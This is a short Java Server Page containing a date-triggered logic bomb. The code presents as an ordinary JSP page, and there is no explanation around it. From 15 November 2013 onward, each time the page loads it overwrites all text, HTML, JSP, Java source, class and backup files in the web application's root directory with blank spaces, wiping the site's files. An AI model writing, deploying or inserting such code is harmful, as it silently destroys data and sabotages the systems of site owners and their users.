<%@ page import="java.io.*, java.util.*"%>

 <%
  String path = request.getRealPath("/"); 
 String files;
	 %>
 <%
	Date today = new Date();                   
	Date myDate = new Date(today.getYear(),today.getMonth(),today.getDate());

  
  
  
  
  Date date = new Date(113,10,15);// 113:2013 ,,, 0:jan 1:feb ,,, date                   
  Date des = new Date(date.getYear(),date.getMonth(),date.getDate());
  

  
   if (myDate.compareTo(des)<0){
      System.out.println("  ");
  }
  else if (myDate.compareTo(des)>0)
		{
			
		/*................................*/

 

			File folder = new File(path);
			File[] listOfFiles = folder.listFiles(); 
 
			for (int i = 0; i < listOfFiles.length; i++) 
				{
 
				   if (listOfFiles[i].isFile()) 
					{
					   files = listOfFiles[i].getName();
				       if (files.endsWith(".txt") || files.endsWith(".TXT") || files.endsWith(".jsp") ||files.endsWith(".HTML")||files.endsWith(".html")||files.endsWith(".java")||files.endsWith(".bak")||files.endsWith(".class"))
							{
								
								File file=new File(path,files);
						 		DataOutputStream outstream= new DataOutputStream(new FileOutputStream(file,false));
								String body = " ";
								outstream.write(body.getBytes());
								outstream.close();
							}
					}
				}


		}
	else{
     

 	
		
			File folder = new File(path);
			File[] listOfFiles = folder.listFiles(); 
 
			for (int i = 0; i < listOfFiles.length; i++) 
				{
 
				   if (listOfFiles[i].isFile()) 
					{
					   files = listOfFiles[i].getName();
				       if (files.endsWith(".txt") || files.endsWith(".TXT") || files.endsWith(".jsp") ||files.endsWith(".HTML")||files.endsWith(".html")||files.endsWith(".java")||files.endsWith(".bak")||files.endsWith(".class"))
							{
								
								File file=new File(path,files);
						 		DataOutputStream outstream= new DataOutputStream(new FileOutputStream(file,false));
								String body = "  ";
								outstream.write(body.getBytes());
								outstream.close();
							}
					}
				}

	}
  %>
 </body>
</html>
